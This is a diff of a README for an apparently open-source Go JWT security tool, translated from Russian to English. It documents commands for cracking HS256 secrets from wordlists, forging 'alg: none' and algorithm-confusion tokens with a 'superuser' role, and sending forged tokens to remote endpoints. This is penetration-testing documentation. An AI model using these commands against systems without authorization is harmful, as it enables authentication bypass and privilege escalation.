@@ -1,22 +1,23 @@
 # JWT Tool
 
-Утилита для работы с JWT токенами на Go. Позволяет декодировать, проверять, создавать и атаковать JWT токены с помощью различных уязвимостей.
+A small Go utility for working with JWT tokens — decode, verify, generate and perform several attack techniques (brute-force secret cracking, "none" algorithm, algorithm confusion).
 
-## Функционал
+This repository is intended for educational and research purposes only. Use responsibly and only against systems you are authorized to test.
 
-- **Decode** - Декодирование и анализ JWT токена
-- **Verify** - Проверка подписи токена с помощью secret
-- **Crack** - Подбор secret методом перебора из wordlist'а
-- **None** - Атака "none" (смена алгоритма на "none")
-- **Confusion** - Атака путаницы алгоритмов (RS256 вместо HS256)
+## Features
 
-## Установка
+- Decode: inspect JWT header, payload and signature
+- Verify: validate HS256 signature with a provided secret
+- Crack: concurrent brute-force of HS256 secret from a wordlist (shows a progress bar)
+- None: create a token with `alg: none` and an arbitrary payload
+- Confusion: algorithm confusion (generate an HS256 token using bytes from a provided public key file as the HMAC secret)
+- Online checks: commands to send tokens to a target endpoint (with optional proxy and TLS insecure flag)
 
-### Требования
+## Requirements
 
 - Go 1.20+
 
-### Сборка
+## Build
 
 ```bash
 git clone https://github.com/ChesstorOtter/jwttool.git
@@ -25,87 +26,109 @@ go mod download
 go build -o jwttool.exe
 ```
 
-## Использование 
-## Декодирование токена
+## Usage (CLI)
+
+General patterns:
+
+- decode: jwttool decode "<token>"
+- verify: jwttool verify "<token>" "<secret>"
+- crack: jwttool crack "<token>" <wordlist>
+- none: jwttool none "<token>" '<json-payload>'
+- confusion: jwttool confusion "<token>" '<json-payload>' <publicKeyPath>
+- attack-none: jwttool attack-none "<token>" <target> <endpoint> [proxy] [insecure:true|false]
+- attack-crack: jwttool attack-crack "<token>" <wordlist> <target> <endpoint> [proxy] [insecure:true|false]
+
+Notes:
+- For JSON payload arguments, wrap the JSON in single quotes on shells that support it.
+- attack-* commands will send the token to target+endpoint (GET) and support optional proxy and insecure TLS.
+
+## Examples
+
+Decode a token:
 ```bash
 go run main.go decode "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
 ```
-Вывод:
-```bash
-Header:
-map[alg:HS256 typ:JWT]
-Payload:
-map[iat:1700000000 role:admin user:bob]
-Signature:
-vTqpZhOul4q31YJ26KQlvMRnv9N0879uHxu5qmNJRmw
-```
-## Проверка подписи токена
+
+Verify a token with a secret:
 ```bash
 go run main.go verify "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." "secret"
 ```
-Вывод при успехе:
-```bash
-Token is valid with secret. secret
-```
-Вывод при ошибке:
-```bash
-Token is invalid with secret. secret
-```
-## Подбор secret из wordlist'а
-Сначала сгенерируйте тестовый токен:
-```bash
-go run generate.go
-```
-Затем выполните crack:
+
+Crack HS256 secret from a wordlist (concurrent, progress bar):
 ```bash
 go run main.go crack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." wordlist.txt
 ```
-Процесс выведет прогресс-бар и найденный secret:
-```bash
+Expected output includes a progress bar and the discovered secret:
+```
 Starting token cracking...
 100% |███████████████████████████████████████████| (80/80, 147874 it/s)
-Token is valid with secret: secret
+Token is valid with secret: "secret"
 ```
-## Атака "none"
-Изменение алгоритма на "none" и подмена payload'а:
+
+None attack — change algorithm to `none` and inject/merge payload:
 ```bash
 go run main.go none "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}'
 ```
-Вывод:
-```bash
+Output:
+```
 New token with 'none' algorithm:
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoic3VwZXJ1c2VyIn0.
+New Payload:
+{
+  "role": "superuser",
+  ...
+}
 ```
-## Атака путаницы алгоритмов
-Подмена алгоритма HS256 на RS256 с использованием приватного ключа:
+(The payload printed is the merged payload — existing fields are preserved and new fields are merged in.)
+
+Confusion attack — generate HS256 token by using the provided public key file bytes as the HMAC secret:
 ```bash
-go run main.go confusion "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}' private_key.pem
+go run main.go confusion "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." '{"role":"superuser"}' public_key.pem
 ```
-Вывод:
-```bash
-New token with 'RS256' algorithm:
-eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJ1c2VyIn0.SIGNATURE_HERE
+Output:
 ```
-## Структура проекта
+New token with 'HS256' algorithm (signed using provided public key bytes):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic3VwZXJ1c2VyIn0.SIGNATURE_BASE64
+```
+
+Online check examples
+
+- Test "none" attack remotely:
 ```bash
+go run main.go attack-none "<token>" https://example.com /api/protected "" false
+```
+
+- Crack + test online (wordlist required):
+```bash
+go run main.go attack-crack "<token>" wordlist.txt https://example.com /api/protected "" false
+```
+When cracking, the tool finds the secret, re-signs the token using HS256 and the discovered secret, then sends the re-signed token to the target endpoint.
+
+## Project structure
+```
 jwttool/
-├── main.go              # Точка входа и обработка команд
-├── generate.go          # Генерация тестовых токенов и wordlist'а
+├── main.go
+├── generate.go
 ├── cmd/
-│   ├── crack.go         # Логика crack команды
-│   ├── decode.go        # Логика decode команды
-│   ├── verify.go        # Логика verify команды
-│   ├── none.go          # Логика none атаки
-│   └── confusion.go     # Логика confusion атаки
+│   ├── crack.go
+│   ├── decode.go
+│   ├── verify.go
+│   ├── none.go
+│   └── confusion.go
 ├── pkg/jwt/
-│   ├── parser.go        # Парсинг JWT токенов
-│   ├── signer.go        # Подпись и проверка HS256
-│   ├── craker.go        # Подбор secret с многопоточностью
-│   ├── none.go          # Реализация none атаки
-│   └── confusion.go     # Реализация confusion атаки
-├── go.mod              # Go модули
-├── go.sum              # Зависимости
-├── .gitignore          # Git ignore файл
-├── payload.json        # Пример payload'а для атак
-└── README.md           # Документация (этот файл)
+│   ├── parser.go
+│   ├── signer.go
+│   ├── craker.go
+│   ├── none.go
+│   └── confusion.go
+├── pkg/http/
+│   └── client.go
+├── go.mod
+├── go.sum
+└── README.md
 ```
+
+## Notes / Security
+
+- The tool performs cryptographic operations and network requests. Be careful with handling keys and tokens.
+- Confusion attack intentionally treats a public key file's raw bytes as an HMAC secret to demonstrate algorithm confusion vulnerabilities — this is intentionally insecure and for demonstration/testing only.
